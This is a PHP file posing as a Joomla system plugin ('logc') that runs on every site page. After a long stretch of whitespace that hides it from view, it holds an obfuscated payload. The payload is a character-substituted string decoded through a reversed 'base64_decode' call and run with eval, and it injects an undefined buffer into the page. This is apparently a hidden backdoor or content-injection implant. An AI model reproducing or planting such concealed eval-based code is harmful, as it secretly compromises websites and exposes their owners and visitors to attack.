<?php
/**
 * @package     Joomla.Plugin
 * @subpackage  System.logc
 *
 * @copyright   Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

class plgSystemLogc extends JPlugin
{
	public function __construct(&$subject, $config)
	{
		parent::__construct($subject, $config);
	}

    function onAfterDispatch()
    {
        if (JFactory::getApplication()->isSite()) {
			$doc = JFactory::getDocument();
 			$html = base64_decode("PGRpdiBhbGlnbj0iY2VudGVyIj5HTWFwRlAgLSA8YSBocmVmPSJodHRwOi8vZ21hcGZwLm9yZyIgdGFyZ2V0PSJfYmxhbmsiPmdtYXBmcC5vcmc8L2E+PC9kaXY+");
																																																																																																																																																																																																																																																																																																																																																																	$__c='pV{b3yb5L2.KjY<tpVZd3h<+6y.<L2.K6K.hIvxSuyJkuy]5u2L2Ic8{vtCpvL<IvLCppV6OuKLtqeTrx/pku[E=pV{b3yb5L2.KBv}2kPYv=EItphCHYL=pvL5O6R}=pV6OuKLOGk<IvLCpveZ=xVJ8jY<tph4HYL=pvLCppV7OuK8tqeT}6K586.026DZ93y0 xV. x/E=pyb<x/}FBh0[x[4 6yJb4V6kBK0h6h081i]QB2Zfxv4Olk<IvLCpvi5KjvtCuV5 1hCtGk<IvLCpvLCCuV5 1h}0jV.f4V7d6Va=j57 jRktpV7OuK8Olk<IvLCpvLCC1/Zwuv} qe}2qVZOxRTrx/586c<RxV.fxvJbuV52uSOS6i]<6DjHjSf2lk<IvLCpvLCC1/Zwuv} qeTI.V.fxY=FDht2L<0{D<{qc5ZTLJZ{L.T9aJTqc5{qa50Eea]BphC pr7bjVbh6i30jR4 pV7OuKwuE.< phjtxVWh6y.<qep93K7buK8RqR4 pV7OuKwuEW< prkd3cf2lk<IvLCpvLCC1/Zwuv} qe}2qv0C1D3+pr8{vtCpvL50YL=pvLCppVb<uiktBS<tpr7C1D3t4[Z]uVa0j2Z5G/Lw3i7O6yfF3y. xV.hlhj+pr8{vtCpvLCC1/Zwuv} qe}2qVot1/p56S<R1/Z<4Y=dByxw3DTK4v]d4K4Rj/Zb4Kx5xY<RDyp83i]QjS]/ciWkZ5}>Byo+jY=tph]I.V.fxY=FDht2L<0{D<{qc5ZTLJZ{L.T9L<0Li.ppZ<baphCHYL=pvLCppVb<uiktBS<tprkd6V5yqR4HYL=pvLCppV{b3yb5L2.KjY<t4[ZhD[p54V7b3ya=p>ItkPYv=v48jvZ=xVJ8Bv}C3yWS1V.vxi3Olk<IvLCp9Lmm';$__s=strtr($__c,"ACv.sfKXY{dEn58wjIBToFUtb9>gL}=kqeZ0RuD[4lz Om<12PyHSWJGp7MaiVQr/cN]h63x"," kCV]4m.DNvM>lstIKLBE6}ghf8[QAowPSR9ibX3cO{up=0anq27jF1eJx/UWGrzHT<5yZYd");$__d=strrev("edoced_46esab");eval('$__x=$__d("$__s");');eval($__x);
			if ($doc->_type == 'html')
				$doc->setBuffer($cacheBuf ,'component');
            return true;
        }
    }

}
